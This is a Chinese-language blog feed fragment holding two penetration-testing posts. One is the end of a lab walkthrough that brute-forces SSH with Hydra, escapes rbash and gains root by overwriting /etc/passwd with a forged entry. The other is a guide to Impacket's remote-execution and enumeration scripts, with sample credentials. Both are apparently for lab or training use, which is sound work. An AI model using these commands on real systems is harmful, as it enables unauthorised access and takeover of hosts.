&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;hydra -L rockyou.txt -p 3_d4y -t 64 ssh://172.16.101.250&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;实在不行就利用翻转重新爆破，rev rockyou.txt&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&#34;ssh服务渗透&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ssh服务渗透&#34;&gt;#&lt;/a&gt; SSH 服务渗透&lt;/h3&gt;
&lt;p&gt;利用知道的用户名和密码进行连接 ssh, 如若出现以下情况，可尝试重写输入 ssh marcus@172.16.101.250 进行连接即可&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210819154553166.png&#34; alt=&#34;image-20210819154553166&#34;&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;ssh marcus@172.16.101.250 (密码3_d4y) &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;成功登录 marcus 用户，但是为低权限&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210819154716920.png&#34; alt=&#34;image-20210819154716920&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;rbash逃逸和提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#rbash逃逸和提权&#34;&gt;#&lt;/a&gt; rbash 逃逸和提权&lt;/h3&gt;
&lt;p&gt;首先，查看可用提权，发现无法成功&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;find / -perm -u=s 2&amp;gt;/dev/null&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210819154911595.png&#34; alt=&#34;image-20210819154911595&#34;&gt;&lt;/p&gt;
&lt;p&gt;需要利用 rbash 逃逸&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;vi&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;:set shell=/bin/sh&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;:shell&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210819155406364.png&#34; alt=&#34;image-20210819155406364&#34;&gt;&lt;/p&gt;
&lt;p&gt;也可以利用 python 进行逃逸，如下&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;python -c &lt;span class=&#34;string&#34;&gt;&amp;#x27;import pty;pty.spawn(&amp;quot;/bin/sh&amp;quot;)&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;python -c &lt;span class=&#34;string&#34;&gt;&amp;#x27;import os;os.system(&amp;quot;/bin/sh&amp;quot;)&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;或者 ssh 服务登录前也可以加入参数逃逸&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;ssh marcus@172.16.101.250 -t &amp;quot;bash --noprofile&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&#34;su提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#su提权&#34;&gt;#&lt;/a&gt; su 提权&lt;/h3&gt;
&lt;p&gt;逃逸成功后，发现可以利用 su 提权&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;思路：&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;当前的环境下可以执行cp和su、sudo权限，即可进行伪造、覆盖passwd文件进行su提权&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;所以，先生成一个伪造用户hack，指定root权限，生成passwd文件进行覆盖/etc/passwd文件，再利用su hack成功提权&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;命令：生成passwd文件的加密用户hack和密码hack&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;openssl passwd -1 -salt hack hack&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210819160109752.png&#34; alt=&#34;image-20210819160109752&#34;&gt;&lt;/p&gt;
&lt;p&gt;创建 /root/passwd 文件，将 /etc/passwd 文件复制进去，添加 hack&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;vim passwd&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;添加hack:$1$hack$xR6zsfvpez/t8teGRRSNr.:0:0:root:/root:/bin/bash&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;覆盖/etc/passwd文件&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cp -p passwd /etc/passwd&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210819160311685.png&#34; alt=&#34;image-20210819160311685&#34;&gt;&lt;/p&gt;
&lt;p&gt;切换 hack 用户，成功&lt;strong&gt;提权&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210819160519286.png&#34; alt=&#34;image-20210819160519286&#34;&gt;&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://chungod.github.io/2021/08/19/impacket%E8%84%9A%E6%9C%AC%E5%88%A9%E7%94%A8/</guid>
            <title>impacket脚本利用</title>
            <link>https://chungod.github.io/2021/08/19/impacket%E8%84%9A%E6%9C%AC%E5%88%A9%E7%94%A8/</link>
            <category>impacket脚本利用</category>
            <pubDate>Thu, 19 Aug 2021 16:48:35 +0800</pubDate>
            <description><![CDATA[ &lt;h2 id=&#34;impacket脚本利用&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#impacket脚本利用&#34;&gt;#&lt;/a&gt; impacket 脚本利用&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;脚本位置&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;/usr/share/doc/python-impacket/examples&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;可以给定脚本权限为777，利用./*.py执行脚本&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;chmod 777 *&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210814143453952.png&#34; alt=&#34;image-20210814143453952&#34;&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;About Impacket：&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Impacket 是一组用于处理网络协议的 Python 类。 Impacket 专注于提供对数据包的低级编程访问，并为某些协议（例如 SMB1-3 和 MSRPC）提供协议实现本身。&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;数据包可以从头开始构建，也可以从原始数据中解析出来，面向对象的 API 使得使用深层次的协议变得简单。该库提供了一组工具作为可以在该库的上下文中完成的操作的示例&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h4 id=&#34;atexecpy&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#atexecpy&#34;&gt;#&lt;/a&gt; &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL0F0ZXhlYy5weQ==&#34;&gt;Atexec.py&lt;/span&gt;（执行命令）&lt;/h4&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL0F0ZXhlYy5weQ==&#34;&gt;Atexec.py&lt;/span&gt;：Impacket 有一个 Python 库，可以帮助攻击者通过 CIFS 主机使用的基于 DCE/RPC 的协议远程访问受害主机，以访问 / 控制 AT-Scheduler 服务并执行任意系统命令。&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;语法：Python atexec.py 域/用户名：password@hostIP命令&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Python atexec.py 用户名：password@IP 命令&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;(如：systeminfo)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210814144220902.png&#34; alt=&#34;image-20210814144220902&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;psexecpy&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#psexecpy&#34;&gt;#&lt;/a&gt; &lt;strong&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3BzZXhlYy5weQ==&#34;&gt;psexec.py&lt;/span&gt;&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;PSEXEC 类似使用 RemComSvc 的功能示例，在 python 脚本的帮助下，我们可以使用此模块远程连接主机，因此您需要执行以下命令。&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;语法：Python psexec.py 域/用户名：密码@hostIP&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;strong&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210814144457456.png&#34; alt=&#34;image-20210814144457456&#34;&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;h4 id=&#34;smbexecpy&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#smbexecpy&#34;&gt;#&lt;/a&gt; &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL1NtYmV4ZWMucHk=&#34;&gt;Smbexec.py&lt;/span&gt;&lt;/h4&gt;
&lt;p&gt;&lt;strong&gt;可执行文件&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL1NtYmV4ZWMucHk=&#34;&gt;Smbexec.py&lt;/span&gt; 使用与不使用 RemComSvc 的 psexec 类似的方法。该脚本以两种方式工作：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;** 共享模式：** 您指定一个共享，一切都通过该共享完成。&lt;/li&gt;
&lt;li&gt;** 服务器模式：** 如果由于任何原因没有可用的共享，此脚本将启动本地 SMB 服务器，因此目标机器将执行的命令的输出发送回本地共享文件夹。请记住，您需要 root 访问权限才能绑定到本地计算机中的端口 445。&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;**语法：Python smbexec.py 域/用户名：密码@hostIP**&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210814144736018.png&#34; alt=&#34;image-20210814144736018&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;wmiexecpy执行命令&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#wmiexecpy执行命令&#34;&gt;#&lt;/a&gt; &lt;strong&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3dtaWV4ZWMucHk=&#34;&gt;wmiexec.py&lt;/span&gt;&lt;/strong&gt;（执行命令）&lt;/h4&gt;
&lt;p&gt;与 smbexec 类似的方法，但通过 WMI 执行命令。这里的主要优点是它在用户（必须是管理员）帐户下运行，而不是在 SYSTEM 帐户下运行，此外，它不会像 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3NtYmV4ZWMucHk=&#34;&gt;smbexec.py&lt;/span&gt; 在创建服务时那样在事件日志中生成嘈杂的消息。缺点是它需要 DCOM，因此，我必须能够访问目标机器上的 DCOM 端口。&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;语法：Python wmiexec.py 域/用户名：密码@hostIP type C:\\flag*.txt &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210814145755131.png&#34; alt=&#34;image-20210814145755131&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;smbmsrpc&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#smbmsrpc&#34;&gt;#&lt;/a&gt; &lt;strong&gt;SMB/MSRPC&lt;/strong&gt;&lt;/h3&gt;
&lt;h4 id=&#34;smbclientpy&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#smbclientpy&#34;&gt;#&lt;/a&gt; &lt;strong&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3NtYmNsaWVudC5weQ==&#34;&gt;smbclient.py&lt;/span&gt;&lt;/strong&gt;&lt;/h4&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;当我们以如下所示的格式向 smbclient 提供以下参数时，我们将连接到目标机器，我们有一个 smb shell，它可以运行一系列命令，如 dir、cd、pwd、put、rename，更多、del、rm、mkdir、rmdir、信息等&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210814170409260.png&#34; alt=&#34;image-20210814170409260&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;lookupsidpy&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#lookupsidpy&#34;&gt;#&lt;/a&gt; &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2xvb2t1cHNpZC5weQ==&#34;&gt;lookupsid.py&lt;/span&gt;（SID 用户枚举）&lt;/h4&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;安全标识符 (SID) 是可变长度的唯一值，用于标识用户帐户。通过 SID 用户枚举，我们可以提取有关存在哪些用户及其数据的信息。Lookupsid 脚本可以枚举本地和域用户。这种攻击也有一个 Metasploit 模块。如果您计划使用金票或银票注入目标服务器，那么需要的一件事就是 500 用户的 SID。Lookupsid.py 可用于该场景。当我们以如下所示的格式向 &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;lookupsid.py [domain]/[user]:[password/password hash]@[Target IP Address]&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210814170750870.png&#34; alt=&#34;image-20210814170750870&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;regpy&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#regpy&#34;&gt;#&lt;/a&gt; &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3JlZy5weQ==&#34;&gt;reg.py&lt;/span&gt;（注册表）&lt;/h4&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;Reg.exe 是一个可执行服务，当与查询、添加、删除关键字的eh 组合使用时，可以读取、修改和删除注册表值。我们甚至可以开始表达访问注册表的重要性。注册表控制系统的每个方面。它可用于获取有关各种策略、软件的信息并更改其中一些策略。&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;语法：&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;./reg.py administrator:123456@172.16.10.180 query -keyName HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows -s&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210814171059794.png&#34; alt=&#34;image-20210814171059794&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;rpcdumppy&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#rpcdumppy&#34;&gt;#&lt;/a&gt; &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3JwY2R1bXAucHk=&#34;&gt;rpcdump.py&lt;/span&gt;（转储文件）&lt;/h4&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;RPC 或远程过程调用是当计算机程序导致过程在不同的地址空间中执行时，该过程被编码为正常的过程调用。这个脚本可以为我们枚举这些端点。它还将它们与一些众所周知的端点相匹配以识别它们。&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210814171312135.png&#34; alt=&#34;image-20210814171312135&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;samrdumppy&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#samrdumppy&#34;&gt;#&lt;/a&gt; &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL1NhbXJkdW1wLnB5&#34;&gt;Samrdump.py&lt;/span&gt; (转储文件)&lt;/h4&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;Samrdump 是一个应用程序，它使用安全帐户管理器 (SAM) 检索有关指定目标机器的敏感信息。它是一个远程接口，可在分布式计算环境/远程过程调用 (DCE/RPC) 服务下访问。它列出了有关目标在本地网络中存在的所有系统共享、用户帐户和其他有用信息。该图像清楚地向我们显示了远程计算机持有的所有用户帐户。检查所有可用共享的敏感数据并访问其他用户帐户可以进一步揭示有价值的信息。&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210814171515937.png&#34; alt=&#34;image-20210814171515937&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;servicespy&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#servicespy&#34;&gt;#&lt;/a&gt; &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3NlcnZpY2VzLnB5&#34;&gt;services.py&lt;/span&gt; (服务)&lt;/h4&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;Impacket 的服务脚本在 MSRPC 接口的帮助下与 Windows 服务进行通信。它可以启动、停止、删除、读取状态、配置、列出、创建和更改任何服务。在处理 Red Teaming 任务时，有很多可以简化的任务，只要我们可以访问 Target 机器的服务。这使得这一切成为一项简单的任务。&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;./services.py administrator:123456@172.16.10.180 list&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
